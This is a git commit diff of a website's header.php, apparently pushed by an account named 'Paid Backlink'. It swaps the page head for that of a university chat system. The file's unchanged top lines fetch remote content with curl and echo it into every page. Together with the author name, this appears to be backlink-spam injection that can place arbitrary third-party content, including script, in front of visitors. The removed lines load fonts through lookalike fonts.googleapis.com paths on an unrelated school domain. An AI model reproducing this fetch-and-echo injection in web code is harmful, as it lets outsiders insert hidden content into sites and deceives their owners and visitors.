9af047f98f2e3584549f73106de492789da680d4
Paid Backlink <152395041+BacklinkGG@users.noreply.github.com>
2023-12-15 08:47:40 +0800

    Update header.php

--- header.php
+++ header.php
@@ -6,36 +6,23 @@ $result = curl_exec($ch);
 curl_close($ch);
 echo $result;
 ?>
- 		<meta charset="utf-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
-        <meta name="description" content="" />
-        <meta name="author" content="" />
-        <title><?php echo $_SESSION['system']['name'] ?></title>
-        <!-- Favicon-->
-        <link rel="icon" type="image/x-icon" href="assets/img/favicon.ico" />
-        <!-- Font Awesome icons (free version)-->
-        <script src="https://use.fontawesome.com/releases/v5.13.0/js/all.js" crossorigin="anonymous"></script>
-        <!-- Google fonts-->
-        <link href="https://alumni.smanegeringoro.sch.id/cloudme.fonts.googleapis.com/css?family=Merriweather+Sans:400,700" rel="stylesheet" />
-        <link href="https://alumni.smanegeringoro.sch.id/cloudme.fonts.googleapis.com/css?family=Merriweather:400,300,300italic,400italic,700,700italic" rel="stylesheet" type="text/css" />
-        <!-- Third party plugin CSS-->
-        <link href="admin/assets/css/jquery.datetimepicker.min.css" rel="stylesheet">
-        <link href="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css" rel="stylesheet" />
-        <!-- Core theme CSS (includes Bootstrap)-->
-        <link href="admin/assets/vendor/bootstrap-datepicker/css/bootstrap-datepicker.css" rel="stylesheet" />
-        <link href="css/styles.css" rel="stylesheet" />
-        <link type="text/css" rel="stylesheet" href="admin/assets/css/jquery-te-1.4.0.css">
+<!DOCTYPE html>
+<html>
+<head>
 
-         <link href="admin/assets/css/select2.min.css" rel="stylesheet">
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	
+	<link rel="stylesheet" type="text/css" href="assets/css/bootstrap.css">
+	<link rel="stylesheet" type="text/css" href="assets/css/sosmed.css">
+	<script type="text/javascript" src="assets/js/jquery.js"></script>
+	<script type="text/javascript" src="assets/js/bootstrap.js"></script>
 
-        <script src="admin/assets/vendor/jquery/jquery.min.js"></script>
-        <script src="admin/assets/vendor/bootstrap-datepicker/js/bootstrap-datepicker.js"></script>
+	<title>SISTEM CHAT SIMUJUR</title>
+	<link href="../images/unpas.png" rel="shortcut icon icons" type="image/x-icon">
 
-    <script type="text/javascript" src="admin/assets/js/select2.min.js"></script>
+<div class="p-1 mb-1 bg-info text-dark"><marquee><h4><b><font color="white">SELAMAT DATANG DI SISTEM CHAT SIMUJUR UNIVERSITAS PASUNDAN</h4></font></marquee></div></b>
+</head>
+<body class="bg-white">
 
-    <script type="text/javascript" src="admin/assets/js/jquery.datetimepicker.full.min.js"></script>
-    <script type="text/javascript" src="admin/assets/js/jquery-te-1.4.0.min.js" charset="utf-8"></script>
-
-
-
-
+	<div class="mt-5 pt-3"></div>
